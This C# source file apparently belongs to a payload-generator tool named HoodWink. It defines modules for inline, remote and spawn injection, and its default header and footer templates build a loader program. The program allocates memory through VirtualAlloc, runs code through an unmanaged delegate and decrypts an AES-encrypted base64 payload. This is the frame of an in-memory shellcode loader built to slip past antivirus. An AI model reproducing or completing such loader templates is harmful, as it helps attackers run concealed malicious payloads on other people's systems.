using System.ComponentModel;

namespace HoodWink.Models
{
    public enum Types
    {
        Inline,
        Remote,
        Spawn
    }
    public abstract class Module
    {
        public abstract string Name { get; }
        public abstract string Description { get; }
        public abstract Types Type { get; }

        [DefaultValue(Defaults.Header)]
        public abstract string Header { get; }

        [DefaultValue(Defaults.Footer)]
        public abstract string Footer { get; }
        public abstract string Core { get; }
    }

    public static class Defaults
    {
        public const string Header = @"
using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Wink
{
   class Program
   {
      // to allocate mem
      [DllImport(""kernel32"")]
      static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

      // to run delegate as unmanaged code
      [UnmanagedFunctionPointer(CallingConvention.Winapi)]
      delegate void WindowsRun();

      public static void Main(string[] args)
      {         
         ";

        public const string Footer = @"private static byte[] Decrypt(string dataBase64, string keyBase64, string ivBase64) 
      {
         using (Aes aes = Aes.Create())
         {
            // Decode data
            byte[] data = Convert.FromBase64String(dataBase64);

            // Set Key and IV
            aes.Key = Convert.FromBase64String(keyBase64);
            aes.IV  = Convert.FromBase64String(ivBase64);

            // Console.WriteLine($""Aes Cipher Mode : {aes.Mode}"");
            // Console.WriteLine($""Aes Padding Mode: {aes.Padding}"");
            // Console.WriteLine($""Aes Key Size :    {aes.KeySize}"");
            // Console.WriteLine($""Aes Block Size :  {aes.BlockSize}"");
            // Console.WriteLine();
            
            // Create decrypter and run
            using (ICryptoTransform decryptor = aes.CreateDecryptor())
            {
               return DoCrypto(data, decryptor);
            }
         }
      }

      // Do Encryption/Decryption on data with provided crypter
      private static byte[] DoCrypto(byte[] data, ICryptoTransform crypter)
      {
         using (MemoryStream ms = new MemoryStream())
         {
            using (CryptoStream cs = new CryptoStream(ms, crypter, CryptoStreamMode.Write))
            {
               cs.Write(data, 0, data.Length);
               cs.FlushFinalBlock();

               return ms.ToArray();
            }
         }
      }

   }
}";

    }
}